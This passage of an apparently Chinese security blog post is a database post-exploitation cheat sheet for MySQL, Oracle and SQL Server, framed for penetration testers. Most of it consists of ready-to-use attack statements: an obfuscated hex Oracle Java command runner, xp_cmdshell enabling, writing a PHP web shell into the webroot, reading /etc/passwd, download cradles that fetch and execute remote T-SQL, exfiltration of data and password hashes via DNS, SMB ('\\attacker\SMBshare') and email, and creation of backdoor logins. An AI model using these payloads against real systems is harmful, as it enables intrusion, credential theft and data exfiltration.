utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70<br>696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696<br>320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b42756<br>66665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d526561646572285<br>2756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e6720737<br>4656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d73746<br>56d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b726574757<br>26e20652e746f537472696e6728293b7d7d7d''));&nbsp;<br>SEXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776<br>e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a<br>617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual&nbsp;<br>/* run OS command */<br>SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;</td></tr></tbody></table>

#### **SQL Server**

<table width="677"><thead><tr><th>名称</th><th align="center">语句</th></tr></thead><tbody><tr><td>xp_cmdshell</td><td align="center">-- Enable show advanced options&nbsp;<br>sp_configure 'show advanced options', 1&nbsp;<br>RECONFIGURE&nbsp;<br>GO &nbsp;<br>-- Enable xp_cmdshell&nbsp;<br>sp_configure 'xp_cmdshell', 1&nbsp;<br>RECONFIGURE&nbsp;<br>GO&nbsp;<br>EXEC xp_cmdshell 'net user'</td></tr><tr><td>写入注册表自动运行</td><td align="center">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/&nbsp;<br>https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</td></tr><tr><td>写入文件自动运行</td><td align="center">https://blog.netspi.com/how-to-hack-database-links-in-sql-server/</td></tr><tr><td>Agent Job</td><td align="center">https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution</td></tr><tr><td>存储过程中的 SQL 注入</td><td align="center">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/</td></tr><tr><td>CLR 组件</td><td align="center">https://blog.netspi.com/attacking-sql-server-clr-assemblies/</td></tr><tr><td>自定义扩展存储过程</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp</td></tr></tbody></table>

##### **TSQL**

<table width="677"><thead><tr><th>名称</th><th align="center">语句</th></tr></thead><tbody><tr><td>ActiveX Javascript Agent Job</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql</td></tr><tr><td>ActiveX VBScript Agent Job</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql</td></tr><tr><td>cmdexec Agent Job</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql</td></tr><tr><td>Powershell Agent Job</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql</td></tr><tr><td>自定义命令行 shell</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp</td></tr><tr><td>OLE 自动化对象</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql</td></tr><tr><td>OPENROWSET</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql</td></tr><tr><td>Python</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql</td></tr><tr><td>R</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql</td></tr><tr><td>xp_cmdshell proxy</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql</td></tr></tbody></table>

### **5、读写文件**

读取和写入文件有助于数据收集和数据泄露。许多方法包括写入 webroot，这可以执行 webshell，或允许数据通过端口 80/443 被泄露。

#### MySQL

`*`需要特权用户

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>转储到文件</td><td align="center">SELECT * FROM mytable INTO dumpfile '/tmp/somefile'</td></tr><tr><td>写入 PHP Shell 到文件</td><td align="center">SELECT 'system($_GET['c']); ?&gt;' INTO OUTFILE '/var/www/shell.php'</td></tr><tr><td>读文件</td><td align="center">SELECT LOAD_FILE('/etc/passwd')</td></tr><tr><td>读取混淆的文件</td><td align="center">SELECT LOAD_FILE(0x633A5C626F6F742E696E69)<br>reads c:\boot.ini</td></tr><tr><td>文件权限</td><td align="center">SELECT file_priv FROM mysql.user WHERE user = 'netspi'<br>SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%netspi%'</td></tr></tbody></table>

#### Oracle

有时可以使用 UTL\_FILE。检查以下是否为非 null

```
如果安装了Java（Oracle Express中不可用），可用于读取和写入文件。
```

#### SQL Server

`*`需要特权用户

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>在服务器中下载 Cradle bulk - TSQL</td><td align="center">-- Bulk Insert - Download Cradle Example<br>-- Setup variables Declare @cmd varchar(8000)<br>-- Create temp table<br>CREATE TABLE #file (content nvarchar(4000));<br>-- Read file into temp table - web server must support propfind<br>BULK INSERT #file FROM '\sharepoint.acme.com@SSL\Path\to\file.txt';<br>-- Select contents of file<br>SELECT @cmd = content FROM #file<br>-- Display command<br>SELECT @cmd<br>-- Run command<br>EXECUTE(@cmd)<br>-- Drop the temp table<br>DROP TABLE #file</td></tr><tr><td>下载 Cradle OAP 1 - SQL</td><td align="center"><br>-- OLE Automation Procedure - Download Cradle Example<br>-- Does not require a table, but can't handle larger payloads<br>-- Note: This also works with unc paths \\ip\file.txt<br>-- Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind.<br>-- Setup Variables<br>DECLARE @url varchar(300)<br>DECLARE @WinHTTP int<br>DECLARE @handle int<br>DECLARE @Command varchar(8000<br>-- Set target url containting TSQL<br>SET @url = 'http://127.0.0.1/mycmd.txt'<br>-- Setup namespace<br>EXEC @handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT<br>-- Call the Open method to setup the HTTP request<br>EXEC @handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'<br>-- Call the Send method to send the HTTP GET request<br>EXEC @handle=sp_OAMethod @WinHTTP,'Send'<br>-- Capture the HTTP response content<br>EXEC @handle=sp_OAGetProperty @WinHTTP,'ResponseText', @Command out<br>-- Destroy the object<br>EXEC @handle=sp_OADestroy @WinHTTP<br>-- Display command<br>SELECT @Command<br>-- Run command<br>EXECUTE (@Command)</td></tr><tr><td>下载 Cradle OAP 2 - TSQL</td><td align="center">-- OLE Automation Procedure - Download Cradle Example - Option 2<br>-- Can handle larger payloads, but requires a table<br>-- Note: This also works with unc paths \ip\file.txt<br>-- Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind.<br>-- Setup Variables<br>DECLARE @url varchar(300)<br>DECLARE @WinHTTP int<br>DECLARE @Handle int<br>DECLARE @Command varchar(8000)<br>-- Set target url containting TSQL<br>SET @url = 'http://127.0.0.1/mycmd.txt'<br>-- Create temp table to store downloaded string<br>CREATE TABLE #text(html text NULL)<br>-- Setup namespace<br>EXEC @Handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT<br>-- Call open method to configure HTTP request<br>EXEC @Handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'<br>-- Call Send method to send the HTTP request<br>EXEC @Handle=sp_OAMethod @WinHTTP,'Send'<br>-- Capture the HTTP response content<br>INSERT #text(html)<br>EXEC @Handle=sp_OAGetProperty @WinHTTP,'ResponseText'<br>-- Destroy the object<br>EXEC @Handle=sp_OADestroy @WinHTTP<br>-- Display the commad<br>SELECT @Command = html from #text<br>SELECT @Command<br>-- Run the command<br>EXECUTE (@Command)<br>-- Remove temp table<br>DROP TABLE #text</td></tr><tr><td>读取文件 - TSQL</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql<br>https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql<br>https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx<br>https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql<br>https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql<br>https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql</td></tr><tr><td>写文件 - TSQL</td><td align="center">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql<br>https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql</td></tr></tbody></table>

### **6、横向移动**

横向移动允许测试人员访问不同的功能 / 数据集，这些功能 / 数据不明确要求为特权的用户。横向切换用户帐户将暴露不同的信息，并可能有助于损害更多特权用户。

#### **MySQL**

**`*`需要特权用户**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>创建用户</td><td align="center">CREATE USER 'netspi'@'%' IDENTIFIED BY 'password'</td></tr><tr><td>删除用户</td><td align="center">DROP USER netspi</td></tr></tbody></table>

#### Oracle

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>创建用户</td><td align="center">CREATE USER user IDENTIFIED by pass;</td></tr><tr><td>删除用户</td><td align="center">DROP USER user</td></tr></tbody></table>

#### **SQL Server**

**`*`需要特权用户**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>创建用户</td><td align="center">EXEC sp_addlogin 'user', 'pass';</td></tr><tr><td>删除用户</td><td align="center">EXEC sp_droplogin 'user';</td></tr><tr><td>链接抓取</td><td align="center">https://blog.netspi.com/sql-server-link-crawling-powerupsql/</td></tr><tr><td>作为当前服务连接到远程数据库</td><td align="center">--Requires sysadmin&nbsp;<br>SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Server=MSSQLSRV04\SQLSERVER2016;Trusted_Connection=yes;').master.dbo.sysdatabases</td></tr></tbody></table>

### **7、数据泄露**

泄漏的数据以及任何受损数据的脱机副本可以用来做数据分析。数据可以通过文件，各种 Layer 4 请求和隐藏技术被泄漏。

**`*` 需要特权用户**

#### **MySQL**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>DNS 请求</td><td align="center"><code>SELECT LOAD\_FILE(concat('\\\\',(QUERY\_WITH\_ONLY\_ONE\_ROW), 'yourhost.com\\'))</code></td></tr><tr><td>SMB 分享</td><td align="center"><code>SELECT * FROM USERS INTO OUTFILE '\\attacker\SMBshare\output.txt'</code></td></tr><tr><td>HTTP 服务器</td><td align="center"><code>SELECT * FROM USERS INTO OUTFILE '/var/www/html/output.txt'</code></td></tr><tr><td>数字连接</td><td align="center"><code>SELECT length(user())</code><br><code>SELECT ASCII(substr(user(),1))&nbsp;</code><br>当数据只能作为数字导出时，转换为 ASCII。有关自动化点击此处连接.</td></tr></tbody></table>

#### Oracle

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>将多行合并为一行</td><td align="center"><code>SELECT dbms_xmlgen.getxmltype('select user from dual') FROM dual</code></td></tr><tr><td>XML 外部实体</td><td align="center"><code>SELECT xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://IP/test"&gt; %remote; %param1;]&gt;') FROM dual;</code></td></tr><tr><td>URL_HTTP 请求 (Pre-11gR2)</td><td align="center"><code>SELECT UTL_HTTP.request ('http://IP/test') FROM dual;</code></td></tr><tr><td>避免特殊字符</td><td align="center"><code>SELECT UTL_URL.escape('http://IP/'</code>&nbsp;&nbsp;||&nbsp;<code>USER) FROM dual;</code></td></tr></tbody></table>

#### SQL Server

注意：可以从 MSSQL 发出 DNS 请求。但是，此请求需要管理员权限和 SQL Server 2005。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>制造 DNS 请求</td><td align="center"><code>DECLARE @host varchar(800); select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + 'netspi.com' from sys.sql_logins;exec('xp_fileexist "\' + @host + 'c$boot.ini"');</code></td></tr><tr><td>UNC 路径（DNS 请求）</td><td align="center"><code>xp_dirtree ‘\\data.domain.com\file’</code></td></tr><tr><td>启用<code>sp_send_dbmail</code>并发送查询</td><td align="center"><code>sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail XPs', 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients='harold@netspi.com',@query='select @@version';</code></td></tr><tr><td>基本的<code>xp_sendmail</code>查询</td><td align="center"><code>EXEC master..xp_sendmail 'harold@netspi.com', 'This is a test.'</code></td></tr><tr><td>使用<code>xp_sendmail</code>发送完整的电子邮件</td><td align="center"><code>EXEC xp_sendmail @recipients='harold@netspi.com', @message='This is a test.', @copy_recipients='test@netspi.com', @subject='TEST'</code></td></tr><tr><td>通过<code>xp_sendmail</code>发送查询结果</td><td align="center"><code>EXEC xp_sendmail 'harold@netspi.com', @query='SELECT @@version';</code></td></tr><tr><td>通过<code>xp_sendmail</code>发送查询结果作为附件</td><td align="center"><code>CREATE TABLE ##texttab (c1 text) INSERT ##texttab values ('Put messge here.') DECLARE @cmd varchar(56)SET @cmd = 'SELECT c1 from ##texttab'EXEC master.dbo.xp_sendmail 'robertk',@query = @cmd, @no_header='TRUE'DROP TABLE ##texttab</code></td></tr></tbody></table>

### **8、持久**

在系统上获得持久性可在网络中创建半永久性的立足点，从而延长利用时间。有了这个额外的时间，可以尝试不同的载体和利用方法。

`*`需要特权用户

#### MySQL

还没有数据，如果你知道任何有用的方法，请在我们的 Github 上做出贡献！

#### Oracle

还没有数据，如果你知道任何有用的方法，请在我们的 Github 上做出贡献！

#### SQL Server

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>启动存储过程</td><td align="center">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</td></tr><tr><td>触发器</td><td align="center">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</td></tr><tr><td>Regwrite</td><td align="center">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</td></tr></tbody></table>

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)

**【好书推荐】  
**

![](https://mmbiz.qpic.cn/mmbiz_png/ffq88LJJ8oPhzuqa2g06cq4ibd8KROg1zLzfrh8U6DZtO1oWkTC1hOvSicE26GgK8WLTjgngE0ViaIFGXj2bE32NA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/x1FY7hp5L8Hr4hmCxbekk2xgNEJRr8vlbLKbZjjWdV4eMia5VpwsZHOfZmCGgia9oCO9zWYSzfTSIN95oRGMdgAw/640?wx_fmt=gif)

[2020hw 系列文章整理（中秋快乐、国庆快乐、双节快乐）](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247492405&idx=1&sn=c84692daf6077f5cc7c348d1e5b3a349&chksm=f9e38c6ece9405785260b092d04cfb56fec279178d4efcd34bf8121b89a28885bf20568cdfda&scene=21#wechat_redirect)  

[HW 中如何检测和阻止 DNS 隧道](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247492405&idx=2&sn=7afccd524c176b4912526d8f5d58dc3a&chksm=f9e38c6ece940578b5a4f0f102fa5a20b6facee51f23e3fa25598e9e7257c798180edcdf5802&scene=21#wechat_redirect)

[ctf 系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493664&idx=1&sn=40df204276e9d77f5447a0e2502aebe3&chksm=f9e3877bce940e6d0e26688a59672706f324dedf0834fb43c76cffca063f5131f87716987260&scene=21#wechat_redirect)

[日志安全系列 - 安全日志](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494122&idx=1&sn=984043006a1f65484f274eed11d8968e&chksm=f9e386b1ce940fa79b578c32ebf02e69558bcb932d4dc39c81f4cf6399617a95fc1ccf52263c&scene=21#wechat_redirect)

[【干货】流量分析系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494242&idx=1&sn=7f102d4db8cb4dddb5672713803dc000&chksm=f9e38539ce940c2f488637f312fb56fd2d13a3dd57a3a938cd6d6a68ebaf8806b37acd1ce5d0&scene=21#wechat_redirect)

[【干货】超全的 渗透测试系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494408&idx=1&sn=75b61410ecc5103edc0b0b887fd131a4&chksm=f9e38453ce940d450dc10b69c86442c01a4cd0210ba49f14468b3d4bcb9d634777854374457c&scene=21#wechat_redirect)

[【干货】持续性更新 - 内网渗透测试系列文章](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494623&idx=1&sn=f52145509aa1a6d941c5d9c42d88328c&chksm=f9e38484ce940d920d8a6b24d543da7dd405d75291b574bf34ca43091827262804bbef564603&scene=21#wechat_redirect)  

[【干货】android 安全系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494707&idx=1&sn=5b2596d41bda019fcb15bbfcce517621&chksm=f9e38368ce940a7e95946b0221d40d3c62eeae515437c040afd144ed9d499dcf9cc67f2874fe&scene=21#wechat_redirect)

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnAsbXzXAVx0TwTHEy4yhBTShsTzrKfPqByzM33IVib0gdPRn3rJw3oz2uXBa4h2msAcJV6mztxvjQ/640?wx_fmt=png)